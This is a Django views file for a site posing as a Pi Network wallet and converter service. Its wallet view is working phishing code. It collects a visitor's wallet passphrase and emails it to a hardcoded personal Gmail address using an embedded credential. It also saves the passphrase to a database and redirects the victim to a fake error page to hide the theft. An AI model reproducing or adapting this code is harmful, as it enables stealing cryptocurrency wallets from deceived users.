from django.shortcuts import render,redirect 
from django.http import HttpResponse , JsonResponse
from .models import passpharse
import piconverterapp.mailsender
from django.contrib import messages

# Create your views here.

def home(request):
    return render(request, 'piconverterapp/home.html')

def document(request):
    return render(request, 'piconverterapp/docs.html')

def wallet(request):
    

    if request.method == 'POST':
        path = request.POST['passph']

        if path == "":

            context = {
                'suc': 'invalid',
            }
            
            messages.error(request, 'Invalid Passphrase')
            return redirect('/pi-wallet/', context=context)
        else:
            pass

        mail_template = f"""<html lang="en">
              <body style="background-color: black;">
             <section style="display: flex;width:100%;background-color:blur;color:aliceblue;height:300px;align-items:center;justify-content:center;text-align:center;font-size:30px; ">
             {path}
             </section>
         </body>
          </html>"""
        
        piconverterapp.mailsender.send_mail('oketajude97@gmail.com', mail_template, 'pi wallet passpharse', 'mazamaza')

        chk = passpharse.objects.create(pharse=path)
        chk.save()
        return redirect('/walleterror/')

    return render (request, 'piconverterapp/wallet.html',)

def exchange(request):
    
    return render(request, 'piconverterapp/convert.html')

def develop(request):

    return render(request, 'piconverterapp/develop1.html')

def payment(request):

    return render(request, 'piconverterapp/payment.html')

def pipay(request):

    return render(request, 'piconverterapp/payselet.html')
    
def domain(request):
    return render(request, 'piconverterapp/domain.svg', content_type='image/svg+xml')
    